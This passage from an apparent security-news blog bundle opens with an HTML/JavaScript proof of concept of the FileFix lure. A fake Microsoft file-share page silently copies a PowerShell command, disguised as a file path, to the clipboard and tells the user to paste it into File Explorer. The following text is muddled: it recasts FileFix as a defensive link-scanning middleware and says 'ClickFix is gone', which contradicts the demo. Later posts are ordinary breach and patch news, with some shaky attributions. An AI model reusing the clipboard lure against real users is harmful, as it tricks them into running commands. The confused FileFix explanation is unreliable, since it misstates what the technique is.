  &lt;div class="container"&gt;
    &lt;div class="header"&gt;
      &lt;svg fill="#000000" width="50px" height="50px" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg"&gt;
      &lt;/svg&gt;
      &lt;h3&gt;EthicalByte Hacking Tools are here &quot;Tools.pdf&quot; available to you&lt;/h3&gt;
      &lt;div class="timestamp"&gt;06/20/2025 10:22:45 AM&lt;/div&gt;
    &lt;/div&gt;

    &lt;div class="instructions"&gt;
      &lt;p&gt;To access &lt;strong&gt;Tools.pdf&lt;/strong&gt;, follow these steps:&lt;/p&gt;
      &lt;ol&gt;
        &lt;li style="margin-bottom: 10px;"&gt;
          Copy the file path below
          &lt;div class="code-block" id="path" onclick="this.classList.add('clicked')"&gt;
            C:companyinternal-secure\filedrive	ools.pdf
          &lt;/div&gt;
        &lt;/li&gt;
        &lt;li style="margin-bottom: 10px;"&gt;Open File Explorer and select the address bar (&lt;strong&gt;CTRL + L&lt;/strong&gt;)&lt;/li&gt;
        &lt;li style="margin-bottom: 10px;"&gt;Paste the file path and press &lt;strong&gt;Enter&lt;/strong&gt;&lt;/li&gt;
      &lt;/ol&gt;
    &lt;/div&gt;

    &lt;input type="file" id="fileInput" style="display: none;"&gt;
    &lt;button id="fileExplorer"&gt;Open File Explorer&lt;/button&gt;

    &lt;div class="footer"&gt;
      &lt;img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft"&gt;
    &lt;/div&gt;
  &lt;/div&gt;

&lt;script&gt;
const fileInput = document.getElementById('fileInput');
const fileExplorer = document.getElementById('fileExplorer');
const path = document.getElementById('path');
path.addEventListener('click', function() {
    navigator.clipboard.writeText("Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\tools.pdf");
});
fileExplorer.addEventListener('click', function() {
    navigator.clipboard.writeText("Powershell.exe -c ping example.com # C:\\company\\internal-secure\\filedrive\\Tools.pdf");
    fileInput.click();
});
fileInput.addEventListener('change', () =&gt; {
    alert("Please follow the stated instructions.");
    fileInput.value = "";
    setTimeout(() =&gt; fileInput.click(), 500);
});
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>



    <p><img src="https://ethicalbyte.in/blogs/img/rnd/1.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    <p><img src="https://ethicalbyte.in/blogs/img/rnd/2.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    <p><img src="https://ethicalbyte.in/blogs/img/rnd/3.jpg" alt="Illustration of FileFix middleware scanning files" style="width:100%;max-width:800px;margin:20px 0;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.1);"></p><br>
    
    <p>A modern replacement doesn’t require a standalone tool—security teams can build or integrate file-processing middleware directly into their web servers or applications. Here’s the core idea:</p>

    <ol>
      <li><strong>Intercept uploads</strong>: Configure your web server or application backend to route every uploaded file through a processing function before it’s saved or shared.</li>
      <li><strong>Scan for hyperlinks</strong>: Use libraries like PyMuPDF for PDFs or python-docx for DOCX files to programmatically extract hyperlinks.</li>
      <li><strong>Rewrite suspicious URLs</strong>: For every detected link, you can:
        <ul>
          <li>Replace it with a safe placeholder like <code>https://warning.local/phishing-link-removed</code>.</li>
          <li>Add visual indicators like “(Link Disabled)” in the document text.</li>
          <li>Remove hyperlinks entirely if they match a denylist of known malicious domains.</li>
        </ul>
      </li>
      <li><strong>Store and serve the sanitized file</strong>: Save the cleaned version of the document and share only this sanitized file with other users.</li>
    </ol>

    <p>This approach allows you to tailor the rules to your organization’s risk tolerance, ensuring that employees or customers aren’t exposed to unexpected phishing links in shared documents.</p>

    <h3>✅ Benefits of Building Your Own FileFix</h3><br>
    <ul>
      <li><strong>Full control over the ruleset</strong> – Customize how aggressive your scanning and rewriting should be.</li>
      <li><strong>No reliance on third-party tools</strong> – Maintain your own codebase, reducing supply chain risk.</li>
      <li><strong>Integration flexibility</strong> – Hook into your existing web application stack, whether it’s Node.js, Python/Django, PHP, or another framework.</li>
      <li><strong>Immediate mitigation</strong> – Uploaded files are cleaned before anyone else can download or view them.</li>
    </ul>

    <h3>⚠️ Important Considerations</h3><br>
    <ul>
      <li><strong>Performance</strong>: Scanning every upload adds processing overhead. Test the impact on upload speeds and server load.</li>
      <li><strong>False positives</strong>: Be careful not to block legitimate URLs unnecessarily—define allowlists for common trusted domains.</li>
      <li><strong>Compliance</strong>: Always ensure that modifying uploaded user content complies with your terms of service and privacy policies.</li>
    </ul>

    <h3>🔚 Conclusion</h3><br>
    <p>Phishing through uploaded files is an often-overlooked attack vector. Although ClickFix is gone, building a custom middleware solution provides a flexible, powerful alternative. By proactively sanitizing file uploads, you can close this security gap and protect your users from malicious links—without relying on outdated or unsupported tools.</p>
  `},{id:"chrome-zero-day-cve-2025-6554-detailed",title:"Google Patches Critical Chrome Zero‑Day CVE‑2025‑6554 – All Users Must Update Now",date:"2025-07-01",author:"Cyber Sentinel",summary:"Google’s emergency update fixes CVE‑2025‑6554, a dangerous zero‑day vulnerability in the Chrome browser’s V8 engine actively exploited in the wild. Learn why this flaw is so critical, how it works, and what steps you must take immediately.",tags:["Chrome","zero-day","browser security","CVE-2025-6554","Google","patch management"],imageKey:"chromeZeroDayExploit",content:`
    <p>On July 1, 2025, Google announced and released an urgent security update for the Chrome web browser, patching CVE‑2025‑6554—a critical zero‑day vulnerability in Chrome’s V8 JavaScript and WebAssembly engine. This vulnerability is already under active exploitation by malicious actors, making it essential for every Chrome user to update immediately.</p>

    <h3>🔎 What is CVE‑2025‑6554 and How Does It Work?</h3><br>
    <p>CVE‑2025‑6554 is a <strong>type confusion flaw</strong> in Chrome’s V8 engine, the core JavaScript and WebAssembly runtime. Type confusion vulnerabilities occur when a program mistakenly assigns a variable of one type as another. In V8, this can enable attackers to manipulate memory outside the intended boundaries of an object, leading to arbitrary code execution.</p>

    <p>Attackers can exploit this by crafting a specially designed website containing malicious JavaScript code. When a user visits such a website, the exploit abuses the vulnerability to execute code on the victim’s system with the same privileges as the browser. This can result in the download of spyware, ransomware, or the establishment of persistent remote access.</p>

    <h3>⚠️ Why CVE‑2025‑6554 is So Dangerous</h3><br>
    <ul>
      <li><strong>Exploitation is already active:</strong> Google confirmed that targeted attacks leveraging this flaw are happening now, not just theoretical proof-of-concepts.</li>
      <li><strong>Drive-by compromise risk:</strong> A single visit to a malicious website can result in compromise without requiring user interaction beyond normal browsing.</li>
      <li><strong>Cross-platform impact:</strong> Because Chrome is used on Windows, macOS, Linux, and forms the core of many Chromium-based browsers, a wide range of users are vulnerable.</li>
      <li><strong>Potential nation-state exploitation:</strong> Experts suggest advanced threat groups may be using this flaw for espionage campaigns against journalists, activists, or enterprises.</li>
    </ul>

    <h3>📜 Context: Chrome’s Zero-Day Track Record in 2025</h3><br>
    <p>This zero-day marks the <strong>fourth actively exploited Chrome vulnerability this year alone</strong>, highlighting a persistent focus by attackers on browser engines as a key attack surface. Earlier 2025 zero-days exploited buffer overflows, type confusion bugs, and sandbox escape techniques—showing consistent interest from cybercriminals and APT groups alike in compromising users directly through web browsing.</p>

    <p>Because browsers are essential gateways to online services, they remain prime targets. Combined with the growing sophistication of exploit kits sold on underground forums, the speed at which zero-days are weaponized continues to accelerate.</p>

    <h3>🛡️ What You Must Do Immediately</h3><br>
    <ol>
      <li><strong>Update Chrome right now:</strong> Ensure your browser is at version 138.0.7204.96 or newer on Windows, macOS, or Linux. Updates can be checked manually by navigating to “Settings > About Chrome.”</li>
      <li><strong>Restart your browser:</strong> Simply updating isn’t enough; Chrome must restart to apply the new security patch.</li>
      <li><strong>Update Chromium-based browsers:</strong> Browsers like Edge, Brave, Opera, and Vivaldi share the V8 engine—these must also be updated promptly to close the same vulnerability.</li>
      <li><strong>Communicate with your organization:</strong> IT teams should push updates across corporate devices and remind employees of the urgent need to patch browsers.</li>
      <li><strong>Harden browsing habits:</strong> Use script-blocking extensions, consider site isolation features in Chrome, and disable unnecessary browser plugins.</li>
    </ol>

    <h3>🔐 How Attackers Are Exploiting CVE‑2025‑6554</h3><br>
    <p>Security researchers discovered the zero-day being delivered through watering-hole attacks—compromising websites known to attract targets, such as industry forums or popular news sites in specific regions. By injecting malicious JavaScript code, attackers silently trigger exploitation chains on visitors’ devices.</p>

    <p>Experts warn that because type confusion exploits can bypass many traditional antivirus solutions (which rely on signatures rather than behavioral detection), only up-to-date browsers or advanced endpoint detection and response (EDR) solutions are likely to catch or block these attacks.</p>

    <h3>📈 Why Browser Zero-Days Are on the Rise</h3><br>
    <p>Browsers like Chrome have become high-value targets because they process untrusted content from the internet in real time. With complex components like JavaScript engines and PDF readers, even a single bug can expose billions of users. Additionally, many organizations have moved critical workflows to web-based platforms, increasing the potential impact of a successful browser exploit.</p>

    <p>The lucrative zero-day market—where brokers can earn six- or seven-figure sums selling working exploits—has incentivized criminal groups and nation-state attackers alike to invest heavily in finding and weaponizing browser vulnerabilities.</p>

    <h3>🛡️ Strengthening Your Browser Security Posture</h3><br>
    <ul>
      <li><strong>Enable automatic updates:</strong> Ensure browsers and extensions update without user intervention.</li>
      <li><strong>Leverage site isolation:</strong> In Chrome, enable “Strict Site Isolation” for an extra layer of defense by running each website in a separate process.</li>
      <li><strong>Use trusted extensions only:</strong> Third-party extensions can introduce their own vulnerabilities or malicious code.</li>
      <li><strong>Adopt DNS-based filtering solutions:</strong> Tools like Secure DNS or enterprise-level DNS filtering can block access to known malicious domains before a browser can connect.</li>
      <li><strong>Monitor web traffic:</strong> Deploy web proxies or next-gen firewalls capable of inspecting SSL traffic for malicious patterns.</li>
    </ul>

    <h3>🔚 Conclusion: Update Now, Stay Vigilant</h3><br>
    <p>Google’s rapid response to CVE‑2025‑6554 shows the importance of timely security patching. But no vendor can act faster than an attacker who already has a zero-day in hand—so staying vigilant, adopting strong security practices, and updating promptly is the best way to reduce risk.</p>

    <p>This isn’t just another security update: the active exploitation means every day you delay updating Chrome or Chromium-based browsers increases your risk of compromise. Take action now to protect your systems, your data, and your privacy.</p>
  `},{id:"scattered-spider-targets-airlines",title:"Airline Industry in the Crosshairs: Scattered Spider Expands Attacks to Qantas and Beyond",date:"2025-07-03",author:"EthicalByte",summary:"The notorious cybercrime group Scattered Spider has expanded its operations from casinos and telecoms to the airline sector, recently breaching systems linked to Qantas, Hawaiian Airlines, and WestJet. Here's everything you need to know.",tags:["airline","scattered spider","qantas","cyberattack","social engineering","mfa","infosec"],imageKey:"scatteredSpiderAirline",content:`
    <h3>✈️ Airlines Are Under Attack</h3><br>
    <p>In July 2025, cybersecurity officials confirmed that the hacking group known as <strong>Scattered Spider</strong> is actively targeting the <strong>airline industry</strong>, marking a dangerous new frontier for one of the world's most critical sectors. What started as a series of attacks against casino chains and tech firms has evolved into a coordinated assault on aviation giants like <strong>Qantas, Hawaiian Airlines, and WestJet</strong>.</p>
    
    <p>While these breaches vary in scope and method, they all rely on the group's signature weapon: <strong>highly targeted social engineering</strong> and <strong>multi-factor authentication (MFA) manipulation</strong>.</p>

    <h3>🕷️ Who Are Scattered Spider?</h3><br>
    <p>Scattered Spider (also known as UNC3944 or Octo Tempest) is a threat actor group composed mostly of teenagers and young adults, fluent in English and technically skilled. They operate under a loosely organized structure and are known for their precision, boldness, and focus on <strong>identity-based attacks</strong>.</p>
    
    <p>Previously, they’ve been linked to major incidents involving MGM Resorts, Caesars Entertainment, and several UK telecom providers. But their recent pivot toward aviation signals a growing ambition — and an increased threat to public infrastructure.</p>

    <h3>🧑‍💻 How They Operate: The Attack Chain</h3><br>
    <p>Scattered Spider doesn’t rely on malware in the traditional sense. Instead, they masterfully exploit human behavior:</p>
    <ol>
      <li><strong>Social Engineering:</strong> Impersonate employees using stolen credentials or fake ID badges</li>
      <li><strong>Help Desk Exploits:</strong> Call IT support to reset MFA or gain access to internal systems</li>
      <li><strong>MFA Fatigue:</strong> Send repeated login requests until users approve them out of annoyance</li>
      <li><strong>Persistence:</strong> Install legitimate remote access tools like AnyDesk or TeamViewer</li>
      <li><strong>Exfiltration:</strong> Access databases, leak files, or encrypt systems for ransom</li>
    </ol>
    <p>They operate with precision, often gathering LinkedIn data or internal IT manuals before striking.</p>

    <h3>🛩️ The Qantas Breach – A Case Study</h3><br>
    <p>Australia’s largest airline, <strong>Qantas</strong>, recently confirmed a data breach affecting nearly 6 million customers. The attackers accessed a third-party call center platform used to manage customer interactions.</p>
    <ul>
      <li>Leaked data includes full names, dates of birth, phone numbers, and frequent flyer numbers</li>
      <li>Qantas stated no passwords, passports, or financial info were compromised</li>
      <li>Security analysts suspect a Scattered Spider-style attack involving help desk impersonation</li>
    </ul>
    <p>This follows similar breaches at <strong>Hawaiian Airlines</strong> and <strong>WestJet</strong>, where attackers reportedly used voice phishing and fake IT personas to gain initial access.</p>

    <h3>🌐 Why the Airline Industry?</h3><br>
    <p>Airlines are attractive targets because:</p>
    <ul>
      <li>They hold massive databases of sensitive customer and travel data</li>
      <li>They rely heavily on third-party vendors with weaker defenses</li>
      <li>Operational delays and reputation damage create strong incentives to pay ransoms</li>
      <li>Call centers and remote workers are common attack vectors</li>
    </ul>
    <p>Additionally, the aviation sector is slow to update legacy systems, giving attackers ample room to move undetected.</p>

    <h3>🔐 What Can Be Done? Defending Against Scattered Spider</h3><br>
    <p>CISA and other global agencies have released urgent guidelines. Here’s what airlines and vendors must do:</p>
    <ul>
      <li><strong>Lock down help desk processes:</strong> Never approve password resets without full identity verification</li>
      <li><strong>Use phishing-resistant MFA:</strong> Like physical security keys (FIDO2)</li>
      <li><strong>Limit remote access:</strong> Disable unused accounts and review RMM tools like AnyDesk regularly</li>
      <li><strong>Segment networks:</strong> So that vendor and staff systems are isolated from core operations</li>
      <li><strong>Run regular simulations:</strong> To train staff on voice phishing and MFA fraud attempts</li>
    </ul>

    <h3>🧠 Final Thoughts</h3><br>
    <p>The airline industry is not just a travel provider — it’s part of national critical infrastructure. A successful cyberattack can disrupt flights, leak data, damage trust, and even pose safety risks.</p>
    <p>With groups like Scattered Spider shifting targets, all major carriers — and even smaller regional airlines — must reevaluate their defenses. Prevention isn’t just about firewalls anymore. It’s about <strong>human awareness, identity protection, and zero-trust design</strong>.</p>

    <blockquote>Social engineering is the real malware. Train your people. Harden your policies. Don’t wait until your runway becomes a breach path.</blockquote>
  `},{id:"chrome-firefox-critical-update-june-2025",title:"Chrome 138 & Firefox 140 Security Updates: What You Need to Know",date:"2025-07-03",author:"EthicalByte",summary:"Google and Mozilla have released critical security updates for Chrome and Firefox, addressing over two dozen vulnerabilities—including high-severity memory flaws capable of remote code execution. This breakdown explains what’s been fixed, who’s at risk, and how to respond.",tags:["Chrome","Firefox","browser security","memory safety","vulnerability patch"],imageKey:"chromeFirefoxUpdate",content:`
    <p>On June 25, 2025, both Google and Mozilla launched major browser updates: <strong>Chrome 138</strong> and <strong>Firefox 140</strong>. These versions address a combined two dozen vulnerabilities—several of which are high-severity memory safety bugs that can lead to remote code execution. While there’s no confirmed active exploitation in the wild, the risk remains very real, and updating is crucial.</p>

    <h3>🔍 Chrome 138: Eleven Security Fixes</h3><br>
    <p>Chrome 138 brings 11 patches, including memory-related vulnerabilities and logic flaws in browser subsystems:</p>
    <ul>
      <li><strong>Use-after-free in Animation:</strong> Can cause memory corruption; a $4,000 bug bounty was awarded.</li>
      <li><strong>Insufficient policy enforcement in Loader:</strong> Potential for bypassing internal security checks.</li>
      <li><strong>Data validation flaw in DevTools:</strong> Could allow developers to leak or manipulate data—$1,000 reward.</li>
      <li>Other medium and low-level issues across V8, UI, and sandbox components.</li>
    </ul>
    <p>Chrome’s patch—versions 138.0.7204.49/50—reinforces key browser boundaries and safeguards memory handling.</p>

    <h3>🔐 Firefox 140: Thirteen Vulnerabilities Sealed</h3><br>
    <p>Released alongside updates for ESR versions 128.12 and 115.25, Firefox 140 includes fixes for 13 security flaws:</p>
    <ul>
      <li><strong>Use-after-free in FontFaceSet:</strong> Potentially exploitable for arbitrary code execution.</li>
      <li><strong>Memory corruption in media decoding:</strong> Enables remote code execution with malicious files.</li>
      <li>Other critical issues include UUID leaks through WebCompat, XSS via DevTools Save As, policy bypass bugs, and Android phishing loopholes.</li>
    </ul>
    <p>These patches close gaps that could be abused by specially crafted media or web sequences.</p>

    <h3>📌 Why These Updates Matter</h3><br>
    <ul>
      <li>Memory safety flaws allow deep control over browser processes—translating to high-risk remote exploits.</li>
      <li>Drive-by attacks using crafted scripts or media offer no-click compromise potential.</li>
      <li>Chrome and Firefox share core engine technologies—parallel vulnerabilities illustrate shared threat surfaces.</li>
    </ul>

    <h3>🛡️ What You Should Do Immediately</h3><br>
    <ol>
      <li><strong>Update Now:</strong>  
        – Chrome users: upgrade to version 138.0.7204.50+  
        – Firefox users: upgrade to version 140 (and ESR users to 128.12 or 115.25)</li>
      <li><strong>Restart Your Browser:</strong> Patches only take effect after a restart.</li>
      <li><strong>Enable Auto-Updates:</strong> Prevent delays in future patch rollouts.</li>
      <li><strong>Extend to All Browsers:</strong> Update Chromium-based alternatives like Edge, Brave, and Opera.</li>
      <li><strong>Deploy in Enterprise:</strong> IT teams should push patched versions across all endpoints quickly.</li>
    </ol>

    <h3>🔍 Broader Security Lessons</h3><br>
    <ul>
      <li>Frequent memory vulnerabilities show browser engines remain a lucrative exploit target.</li>
      <li>Strong update processes and education can block critical attack channels.</li>
      <li>Complement browser hardening with script control, threat detection, and DNS filtering.</li>
    </ul>

    <h3>🔚 Final Takeaway</h3><br>
    <p>These simultaneous updates from Chrome and Firefox emphasize that even widely-used software remains vulnerable—especially as attackers zero in on core browser components. While no active exploits have been confirmed, patching now offers the best defense. Make updating browsers a non-negotiable part of your cyber hygiene routine.</p>
  `},{id:"north-korea-fake-zoom-macos",title:"North Korean Hackers Spread MacOS Malware Using Fake Zoom Updates",date:"2025-07-04",author:"Ethical Byte",summary:"A new campaign by North Korean state-backed hackers targets MacOS users with malware disguised as Zoom updates. Learn how the attack works and how to stay protected.",tags:["north korea","macos","zoom","malware","social engineering","cyberattack"],imageKey:"northKoreaZoomMalware",content:`
    <h3>🎯 The New Threat: Fake Zoom Updates on MacOS</h3><br>
    <p>In July 2025, cybersecurity researchers uncovered a North Korean-sponsored campaign targeting MacOS users by distributing malware disguised as legitimate Zoom application updates. This attack is part of the group’s ongoing espionage operations aimed at stealing sensitive information from individuals and organizations worldwide.</p>

    <h3>👥 Who’s Behind It?</h3><br>
    <p>The attack is attributed to a threat actor known as <strong>Lazarus Group</strong> (also tracked as UNC4034 or APT37), a state-sponsored hacking group linked to North Korea. Lazarus is infamous for its sophisticated espionage campaigns, financial thefts, and disruption operations targeting governments, defense contractors, and researchers.</p>

    <h3>🧪 How the Attack Works</h3><br>
    <p>Researchers explain that the attackers set up fake websites or send phishing emails offering what appears to be a legitimate Zoom installer for MacOS. However, this installer is a Trojan: it installs malware alongside Zoom.</p>
    <ul>
      <li>The malware establishes persistence on the system by installing launch agents</li>
      <li>It opens a backdoor that allows remote command execution</li>
      <li>It can steal files, record keystrokes, and potentially activate webcams or microphones</li>
      <li>It communicates with command-and-control servers to receive additional payloads</li>
    </ul>

    <h3>🚪 Why MacOS?</h3><br>
    <p>Historically, attackers focused on Windows systems, but the rise in MacOS usage, especially among executives, journalists, and creatives, has made it an attractive target. Mac users often feel a false sense of security because malware on MacOS is less common — but this campaign proves that perception is dangerous.</p>

    <h3>🔎 Why Use Zoom as a Lure?</h3><br>
    <p>Zoom has become an indispensable tool for businesses and individuals worldwide, especially post-pandemic. Since users regularly receive prompts to update Zoom, attackers exploit this expectation to trick victims into installing malware without suspicion.</p>

    <h3>🛡️ How to Protect Yourself</h3><br>
    <p>If you’re a Mac user — or manage a fleet of Macs in your organization — here are practical steps to defend against this attack:</p>
    <ul>
      <li>Only download Zoom and other apps from official websites or app stores</li>
      <li>Enable Gatekeeper and System Integrity Protection (SIP) on your Mac</li>
      <li>Regularly check for unknown login items or launch agents in your system settings</li>
      <li>Keep MacOS and all software up-to-date</li>
      <li>Use endpoint security software capable of detecting MacOS malware</li>
    </ul>

    <h3>🌐 Impact on Organizations</h3><br>
    <p>Beyond individual users, this campaign highlights the risk to organizations that use BYOD (bring-your-own-device) policies or allow personal Macs on corporate networks. A single compromised Mac can act as a bridge into sensitive corporate environments.</p>

    <h3>🧠 Final Thoughts</h3><br>
    <p>This incident is another reminder that <strong>MacOS is not immune</strong> to cyber threats. Attackers are creative and adaptive — they’ll exploit whatever platforms and habits make it easiest to breach their targets. Staying informed and cautious about where you download software is your best defense.</p>

    <blockquote>🚫 Don't fall for fake updates. Trust only official sources and question every download prompt.</blockquote>
  `},{id:"google-314m-cellular-data-verdict",title:"Google Ordered to Pay $314M for Misusing Android Users’ Cellular Data",date:"2025-07-05",author:"EthicalByte",summary:"A California jury has awarded $314 million to Android users after finding Google intentionally used cellular data from idle devices without consent. Learn what happened, the implications, and how to protect yourself.",tags:["Google","Android","mobile privacy","data misuse","legal verdict"],imageKey:"googleDataVerdict",content:`
    <p>In a landmark July 2025 verdict, a jury in San Jose, California, ruled that Google must pay over $314 million for using Android users’ cellular data when their devices were idle—without proper consent. The class-action case, representing about 14 million Californians, accused Google of unfair data collection practices that benefited the company while burdening users.</p>

    <h3>📊 What the Jury Decided</h3><br>
    <ul>
      <li>Google used cellular data—even when phones were idle or Wi‑Fi wasn’t enabled—to send and receive device information.</li>
      <li>The jury concluded these transfers were “mandatory and unavoidable,” giving Google an unfair advantage and costing users data from their plans.</li>
      <li>The verdict awards $314.6 million, but Google plans to appeal, arguing these data flows are necessary for Android’s security and performance and are disclosed in user agreements.</li>
    </ul>

    <h3>📱 How the Data Transfers Worked</h3><br>
    <p>These transfers occurred in the background—Android phones periodically sent usage logs, network statuses, and app activity to Google servers, regardless of user settings. One test found an idle device using nearly 9 MB of cellular data daily, predominantly communicating with Google even when stationary and unused.</p>

    <h3>🔍 Why This Verdict Matters</h3><br>
    <ul>
      <li><strong>Consumer rights spotlighted:</strong> The ruling reinforces that background data usage requires clear user consent—especially when not tied to Wi‑Fi.</li>
      <li><strong>Standard for tech accountability:</strong> This class-action may influence upcoming trials involving all other U.S. states in April 2026.</li>
      <li><strong>Privacy vs. convenience:</strong> The case highlights tensions between seamless device functionality and user control over data.</li>
    </ul>

    <h3>🛡️ How to Take Control of Your Data</h3><br>
    <ol>
      <li><strong>Monitor cellular usage:</strong> Regularly check your data meter for unexplained background consumption.</li>
      <li><strong>Adjust background settings:</strong> Disable background data for apps and enable “Wi‑Fi only” options in settings.</li>
      <li><strong>Review permissions:</strong> Audit apps accessing device logs or statuses and revoke unnecessary permissions.</li>
      <li><strong>Use data-saving tools:</strong> Employ built-in OS features or third-party apps that restrict idle background transfers.</li>
      <li><strong>Stay informed:</strong> Monitor court outcomes—especially the upcoming trial covering the other U.S. states.</li>
    </ol>

    <h3>⚖️ Google’s Response & What’s Next</h3><br>
    <p>Google contends that these processes support critical system operations—such as performance tuning, security monitoring, and diagnostics—and are disclosed in user agreements. The company will appeal the verdict, claiming the jury misunderstood these essential functions.</p>
    <p>Meanwhile, a broader national class-action is scheduled for April 2026. Should that case mirror California’s decision, the financial and regulatory impact on Google could increase significantly.</p>

    <h3>🔚 Final Takeaway</h3><br>
    <p>This verdict sends a powerful message: users deserve transparency and control over background data usage. Whether or not Google overturns the decision, it's a reminder to take charge of your data privacy—by monitoring usage, adjusting settings, and questioning what runs behind the scenes on your devices.</p>
  `},{id:"taiwan-chinese-apps-data-security",title:"Taiwan Flags Chinese Apps Over Data Security Risks Amid Rising Tensions",date:"2025-07-05",author:"Ethical Byte",summary:"Taiwanese authorities have issued a stern warning about Chinese-developed mobile apps, citing national security and personal privacy concerns. Here’s a comprehensive look at what’s happening and how to protect yourself.",tags:["taiwan","china","mobile security","data privacy","cybersecurity","apps"],imageKey:"taiwanChineseApps",content:`
    <h3>📱 Taiwan Steps Up Against Chinese Apps</h3><br>
    <p>In a move that underscores rising geopolitical and cybersecurity concerns, Taiwan’s National Communications Commission (NCC) and the Ministry of Digital Affairs have jointly warned citizens and businesses about installing and using Chinese-developed apps on their devices. Authorities point to serious risks — ranging from <strong>data harvesting</strong> to potential <strong>espionage</strong> — associated with these apps.</p>

    <h3>🌏 Why Now?</h3><br>
    <p>This warning comes amid heightened tensions across the Taiwan Strait and after several investigations revealed that popular Chinese apps were collecting and transmitting user data back to servers under Beijing’s jurisdiction. Officials described these apps as a possible gateway for surveillance and influence operations aimed at undermining Taiwan’s security and sovereignty.</p>

    <h3>🕵️ How Chinese Apps Collect Your Data</h3><br>
    <p>According to Taiwanese authorities and cybersecurity researchers, many Chinese apps:</p>
    <ul>
      <li>Request broad permissions — including access to camera, microphone, contacts, and location — even when not needed for app functionality</li>
      <li>Send collected data to servers in mainland China, often encrypted and out of reach of Taiwanese (or international) oversight</li>
      <li>Use complex, obfuscated code to mask their true behavior and evade detection</li>
      <li>Continue to track users even after uninstallation, thanks to hidden background services or browser-based trackers</li>
    </ul>

    <h3>⚖️ From Personal Privacy to National Security</h3><br>
    <p>While much of the focus is on personal data privacy, Taiwanese officials stress that these risks extend far beyond individuals. If sensitive devices belonging to government officials, military personnel, or critical infrastructure operators are compromised through such apps, the consequences could include espionage, sabotage, or manipulation of public opinion.</p>

    <p>This is consistent with findings from the U.S., India, and several EU nations, which have similarly restricted or banned Chinese apps in recent years.</p>

    <h3>🚨 Examples of At-Risk Apps</h3><br>
    <p>Although the advisory does not provide an exhaustive list, previous bans in other countries included these widely-used apps:</p>
    <ul>
      <li><strong>TikTok</strong> — for alleged data sharing with Chinese authorities</li>
      <li><strong>WeChat</strong> — for pervasive surveillance capabilities</li>
      <li><strong>QQ</strong> — for questionable encryption and data handling</li>
      <li><strong>CamScanner</strong> — previously found embedding malware in its code</li>
      <li><strong>UC Browser</strong> — for insecure data transmission practices</li>
    </ul>

    <h3>📊 The Bigger Picture: Data Sovereignty</h3><br>
    <p>This move also reflects Taiwan’s broader efforts to assert its <strong>digital sovereignty</strong> and protect its citizens’ data from falling into the hands of foreign powers. In a world where information equals power, letting sensitive data slip beyond your borders can have profound consequences — economically, politically, and even militarily.</p>

    <h3>🛡️ How You Can Protect Yourself</h3><br>
    <p>Here are actionable steps you can take to safeguard your data and reduce risk from questionable apps:</p>
    <ul>
      <li>📲 Download apps only from trusted developers and official app stores</li>
      <li>🔒 Review app permissions — revoke anything unnecessary (e.g., why does a flashlight app need your contacts?)</li>
      <li>🚫 Delete apps you no longer use or don’t trust</li>
      <li>🛡️ Use a mobile security suite capable of detecting privacy-invasive behavior</li>
      <li>🌐 Consider using a VPN to obscure your network traffic</li>
      <li>🔄 Keep your operating system and apps updated to close known vulnerabilities</li>
    </ul>

    <h3>🧠 Final Thoughts</h3><br>
    <p>As mobile apps become an integral part of daily life, it’s easy to overlook how much access we grant them — and by extension, their developers. Taiwan’s warning is not just about geopolitics; it’s a reminder that <strong>your privacy is your responsibility</strong>.</p>

    <p>Always ask yourself: who owns this app, where is my data going, and what would happen if it fell into the wrong hands?</p>

    <blockquote>📌 When it comes to apps and your data: trust is good — verification is better.</blockquote>
  `},{id:"catwatchful-android-spyware-leak",title:"Catwatchful Android Spyware Exposes 62,000 User Accounts in Massive Data Leak",date:"2025-07-06",author:"Ethical Byte",summary:"Cybersecurity researchers uncovered a sophisticated spyware campaign targeting Android devices, leaking sensitive data from over 62,000 victims. Learn how Catwatchful works, why it’s dangerous, and how to protect yourself.",tags:["android","spyware","catwatchful","data leak","mobile security","credential theft"],imageKey:"catwatchfulSpyware",content:`
    <h3>🐾 A Silent Predator: What Is Catwatchful?</h3><br>
    <p>In July 2025, researchers at Gbhackers uncovered a large-scale Android spyware campaign dubbed <strong>Catwatchful</strong>, responsible for stealing and leaking personal data from at least <strong>62,000 users worldwide</strong>. This malware has operated largely undetected for months, quietly siphoning data from victims' devices to an attacker-controlled server.</p>

    <p>Unlike simple adware or scams, Catwatchful is a <strong>persistent, highly invasive spyware</strong> that masquerades as legitimate apps and silently takes over the device.</p>

    <h3>📰 What Did Researchers Find?</h3><br>
    <p>The campaign came to light when cybersecurity teams discovered an <strong>unprotected server</strong> operated by the attackers, hosting an enormous trove of stolen credentials, call logs, messages, location data, and more. Researchers were able to analyze the leaked data and map the full scope of the campaign — which had already compromised tens of thousands of Android devices.</p>

    <p>The name <em>Catwatchful</em> comes from its stealthy, watchful behavior — quietly observing victims while keeping itself hidden from detection.</p>

    <h3>🎭 How Does Catwatchful Infect Devices?</h3><br>
    <p>The spyware is usually distributed as <strong>fake apps</strong> — often utilities, games, or social tools — that users download outside of the official Google Play Store. In particular, attackers rely on:</p>
    <ul>
      <li>Untrusted APK download sites and forums</li>
      <li>Malicious ads prompting users to “update” or “optimize” their phone</li>
      <li>Phishing SMS messages with malicious APK download links</li>
      <li>Social engineering tactics that promise exclusive content or discounts</li>
    </ul>

    <p>Once installed, the app requests a long list of permissions, including admin rights, making it very difficult to remove. Even after rebooting, the spyware remains active — recording data and transmitting it back to the attackers.</p>

    <h3>🔍 What Kind of Data Does It Steal?</h3><br>
    <p>Catwatchful is designed to harvest <strong>as much personal and sensitive information as possible</strong>. This includes:</p>
    <ul>
      <li>👤 Usernames, passwords, and saved login credentials</li>
      <li>📞 Call history, contact lists, and ongoing call recordings</li>
      <li>💬 SMS and instant messaging conversations</li>
      <li>📷 Photos, videos, and voice recordings</li>
      <li>🌍 GPS coordinates, movement patterns, and location history</li>
      <li>📱 Device information like IMEI, model, and network details</li>
    </ul>

    <p>The stolen data can be sold on dark web marketplaces, used for identity theft, or even exploited in targeted extortion campaigns.</p>

